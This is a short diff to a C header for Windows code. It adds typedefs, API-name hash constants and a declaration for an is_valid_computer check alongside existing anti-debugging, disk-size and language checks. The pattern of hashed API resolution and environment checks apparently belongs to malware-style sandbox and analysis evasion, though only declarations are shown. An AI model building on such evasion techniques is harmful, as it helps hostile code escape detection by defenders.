@@ -81,8 +81,13 @@ typedef BOOL(WINAPI *GetDiskFreeSpaceExFuncA)(
     PULARGE_INTEGER
 );
 
+typedef void (WINAPI *GetSystemInfoFunc)(LPSYSTEM_INFO);
+typedef BOOL (WINAPI *GlobalMemoryStatusExFunc)(LPMEMORYSTATUSEX);
+
 typedef uint16_t(WINAPI *GetSystemDefaultLangIDFunc)(void);
 typedef uint16_t(WINAPI *GetSystemDefaultLCIDFunc)(void);
+
+
 
 extern const ObjHash NTDLL_HASH;
 extern const ObjHash KERNEL32_HASH;
@@ -90,6 +95,8 @@ extern const ObjHash KERNEL32_HASH;
 extern const ObjHash QUERY_INFORMATION_PROCESS_HASH;
 extern const ObjHash GET_COMPUTER_NAME_HASH;
 extern const ObjHash GET_DISK_FREE_SPACE_HASH;
+extern const ObjHash GET_SYSTEM_INFO_HASH;
+extern const ObjHash GLOBAL_MEMORY_STATUS_HASH;
 extern const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH;
 extern const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH;
 extern const ObjHash LOAD_LIBRARY_HASH;
@@ -121,6 +128,7 @@ FARPROC CustomGetProcAdress(IN HMODULE hModule, ObjHash function_hash);
 
 bool is_being_debugged();
 int get_disk_size(HMODULE hKernel32dll);
+bool is_valid_computer(HMODULE hKernel32);
 const char* get_hostname(HMODULE hKernel32dll);
 bool is_valid_language(HMODULE hKernel32dll);
 unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right);
